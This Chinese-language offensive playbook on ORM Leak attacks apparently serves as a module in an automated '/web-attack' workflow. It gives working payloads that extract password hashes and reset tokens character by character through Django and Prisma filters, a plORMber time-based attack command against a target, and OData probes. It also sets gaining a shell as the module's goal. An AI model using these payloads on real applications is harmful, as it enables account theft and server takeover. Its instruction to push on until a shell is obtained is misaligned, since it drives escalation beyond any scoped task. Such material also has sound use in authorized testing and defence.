# ORM Leak — 无 SQLi 的 ORM 合法查询语义泄露

> 关键：**ORM Leak 不是 SQL Injection。** Payload 通常是 ORM 本身合法的 filter/where/relation/operator。目标是利用用户可控的查询结构，让 ORM 访问本不该由用户选择的关联字段，并通过响应/错误/时间 Oracle 推断敏感值。

---

## 1. 何时优先想到 ORM Leak

高价值信号：

```
搜索 / filter / advanced search API
JSON body 可以直接传字段名或嵌套对象
Django / DRF / Prisma / Beego / OData / Entity Framework / Ransack
SQLi payload完全没效果，但换字段/操作符会改变结果集
错误里出现 QuerySet / PrismaClient / OData / ORM expression
```

常见危险代码形态：

```python
# Django
Model.objects.filter(**request.data)
```

```javascript
// Prisma
prisma.article.findMany({ where: req.body.query })
```

如果开发者先把用户输入严格映射到 allowlist 字段，再构造查询，则风险大幅下降。

---

## 2. Django — Relational Filtering

### 基础 operator

假设正常参数：

```
title=test
```

测试 Django lookup：

```
title__startswith=t
title__contains=es
title__gt=a
title__lt=z
title__regex=^t
```

JSON：

```json
{"title__startswith":"t"}
```

如果 operator 被后端直接接受 → 继续 relation traversal。

### 一对一/外键穿越

假设 Article → created_by → user → password：

```json
{"created_by__user__password__startswith":"p"}
```

如果返回结果：说明某条关联记录的 password 以 `p` 开头。

继续：

```json
{"created_by__user__password__startswith":"pb"}
{"created_by__user__password__startswith":"pbk"}
```

逐字符提取。

### 绑定具体用户

同时增加约束，避免命中任意关联记录：

```json
{
  "created_by__user__username":"admin",
  "created_by__user__password__startswith":"pbkdf2_"
}
```

### 多对多

思路不是背固定 payload，而是先从正常返回/源码推模型关系：

```
Entry Model
  ↓ relation
Model A
  ↓ relation
Model B
  ↓ sensitive field
```

然后组合：

```
relation1__relation2__field__startswith
```

---

## 3. Django Oracle

### Boolean Response Oracle

```
猜对 → 返回1条/200/长度A
猜错 → 空列表/长度B
```

最稳定。

### Error / Regex Oracle

某些 DBMS/regex 组合可让“匹配”和“不匹配”产生错误/超时差异。

先做最小安全验证，不要直接上大 ReDoS：

```json
{"created_by__user__password__regex":"^pbkdf2_"}
```

只有当靶场允许且需要时，才考虑时间/错误型提取。

---

## 4. Prisma — Nested where / Relation Filter

典型：

```javascript
await prisma.article.findMany({
  where: req.body.query
})
```

JSON relation traversal：

```json
{
  "createdBy": {
    "resetToken": {
      "startsWith": "0"
    }
  }
}
```

如果结果/时间不同 → 可逐字符猜 reset token。

URL encoded object 风格也可能是：

```
filter[createdBy][resetToken][startsWith]=0
```

常见 operator：

```
equals
not
contains
startsWith
endsWith
lt / lte / gt / gte
some / every / none
is / isNot
```

不同 Prisma 版本/字段类型支持不同 operator，先从正常请求/报错推断。

---

## 5. Prisma Time-based — plORMber

当 endpoint **不返回查询结果**，但请求完成时间受数据库查询影响时，可用 `plormber` 做 time-based ORM Leak。

安装：

```
git clone https://github.com/elttam/plormber.git
cd plormber
python3 -m venv venv
source venv/bin/activate
pip install .
```

官方示例形态：

```
plormber prisma-contains \
  --chars '0123456789abcdef' \
  --base-query-json '{"query": {PAYLOAD}}' \
  --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
  --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
  --verbose-stats \
  https://TARGET/articles/time-based
```

**必须按目标真实 JSON 结构改三个 JSON 参数。** 该工具不是“通杀 Prisma”，只是 PoC/SDK。

---

## 6. Beego / Entity Framework / OData

### Beego

如果 filter 参数格式支持：

```
field__operator=value
```

重点测试关联字段表达式是否可被用户拼出来。不要直接假设 Django 双下划线语义完全相同，先用普通字段确认 operator。

### OData / Entity Framework

常见入口：

```
?$filter=...
?$expand=...
?$select=...
```

重点是：

```
是否能沿navigation property访问关联对象
$expand是否暴露本不该返回的字段
$filter是否允许针对敏感关联字段做布尔Oracle
```

例如先用公开字段验证：

```
?$filter=startswith(name,'a')
```

再根据 metadata/schema 选择关联字段。

---

## 7. ORM Leak → /web-attack 的继续目标

ORM Leak 本身常得到：

```
password hash
reset token
API key
session/token
internal object id
hidden role/tenant relation
```

本模块目标仍是 Shell：

```
ORM Leak
  ↓
管理员/服务凭据或重置token
  ↓
登录高权限Web功能
  ↓
插件/上传/模板/命令执行/CI功能
  ↓
Shell
```

如果只拿到数据但没有 Shell，不要把 `/web-attack` 标为完成。

---

## 8. 与 SQLi 区分

```
SQLi:
用户输入改变 SQL 语法/结构

ORM Leak:
用户输入仍然是“合法 ORM 查询语义”
但可以选择本不该访问的 field/relation/operator
```

SQLi 工具 negative 时，如果看到 ORM filter API，不要直接跳过，转本文件。
